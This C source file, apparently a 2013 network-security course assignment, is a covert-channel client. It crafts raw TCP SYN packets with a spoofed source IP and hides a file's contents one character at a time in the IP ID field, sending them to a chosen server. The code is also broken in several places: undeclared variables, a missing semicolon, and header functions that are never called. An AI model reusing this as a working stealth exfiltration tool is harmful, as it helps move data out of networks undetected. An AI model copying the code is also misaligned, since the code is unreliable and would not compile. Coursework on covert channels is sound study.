//
//  client.c
//  
//	The client application implementation
//
//  
//	Created by Andrew Maledy on 2013-04-10.
//	COMP 8505 - Assignment 1
//
#include <stdio.h>			//just the basics...
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>			//library for getting command line arguments..great tool!
#include <string.h> //memset
#include <sys/socket.h>    //for socket ofcourse
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/ip.h>   //Provides declarations for ip header
#include "client.h"
void print_usage()
{
    printf("Usage: ./a.out -s <server ip> -c <client_ip> -p <port>\n");
}

int main(int argc, char *argv[])
{

	
	int c, long_index=0; //for getopt
	char* server_ip, *client_ip, *filename; // client collected data
	char buffer[PCKT_LEN];
	int sport = 0;
	int dport = 80;
	int sfd;
	char ch; 
	FILE *file;
	//int long_index=0;
    static struct option long_options[] = {
        {"server-ip",      required_argument, 0,  's' },
        {"client-ip",      required_argument, 0,  'c' },
        {"sport",      required_argument, 0,  'p' },
        {"dport",      required_argument, 0,  'd' },

    };

	while ((c = getopt_long (argc, argv, "s:c:p:d:f:",long_options, &long_index)) != -1)
	         switch (c)
	           {
	           case 's':
	             server_ip = optarg;
	             break;
	           case 'c':
	             client_ip = optarg;
	             break;
	           case 'p':
	             sport = atoi(optarg);
	             break;
	           case 'f':
	             filename = optarg;
	             break;
	           case 'd':
	           	  dport = atoi(optarg);
	           	  break;
	           default:
	           	print_usage();
	            exit(EXIT_FAILURE);
	           }	           
	           if(( server_ip == NULL) || (client_ip == NULL ))
	           {
	           	print_usage();
	           	exit(EXIT_FAILURE);
	           }
	if(sport == 0)
		sport = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
	
	printf("Source IP: %s, Destintation IP: %s, Dest port: %d, Source. port: %d \n", server_ip, client_ip, dport, sport);

	//create the socket which we'll be writing to.	
	sfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);	
    if(sfd == -1)
    {
        //socket creation failed, probably not run as root...
        perror("Failed to create socket (check that you are root):");
        exit(1);
    }
 	char packet[4096]; //master packet buffer (we'll fill it in below)
 	memset (packet, 0, 4096);
 	//IP header
    struct ip *iph = (struct ip *) packet;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip)); //after the iphdr comes the tcphdr

    struct sockaddr_in sin; 
    struct pseudo_header pseudohdr;
 	
 	//address resolution
    sin.sin_family = AF_INET;
    sin.sin_port = htons(sport);
    sin.sin_addr.s_addr = inet_addr(server_ip);

    //Forge the TCP checksum
    pseudohdr.source_address = inet_addr( source_ip );
    pseudohdr.dest_address = sin.sin_addr.s_addr;
    pseudohdr.placeholder = 0;
    pseudohdr.protocol = IPPROTO_TCP;
    pseudohdr.tcp_length = htons(sizeof(struct tcphdr));
	memcpy(pseudogram , (char*) &pseudohdr , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcphdr , sizeof(struct tcphdr));
	//now set it with our pretend data ;)
	tcph->check = csum( (unsigned short*) pseudogram , psize);
    
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
    //Networking done... time so send file

	if((file=fopen(filename,"rb"))== NULL)
	 {
		printf("Can't open file %s \n",filename);
	 	exit(1);
	 }
	else while((ch=fgetc(input)) !=EOF)
	//file opened...look through each character and send the packet
	{
		iphdr->id = ch; //the payload hidden in the id field
		iphdr->seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
		if (sendto (s, packet, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send. Character : %c \n" , iph->id);
        }
	}

}

/*
* 	Fills in the a supplied IP header
*/
void fill_iphdr(struct ip* ip_header, char* source_ip, char* dest_ip)
{
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
    iph->daddr = inet_addr(dest_ip);
     

}
/*
* 	Fills in the a supplied TCP header
*/
void fill_tcphdr(struct ip* ip_header, char* source_port, char* dest_port)
{
    //Fill in TCP Header
    tcph->source = htons(source_port);
    tcph->dest = htons(dest_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;  //tcp header size
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0


}

//
// Calculate checksum
//
unsigned short calculate_checksum(unsigned short *buf, int len)
{
        unsigned long sum;
        for(sum=0; len>0; len--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
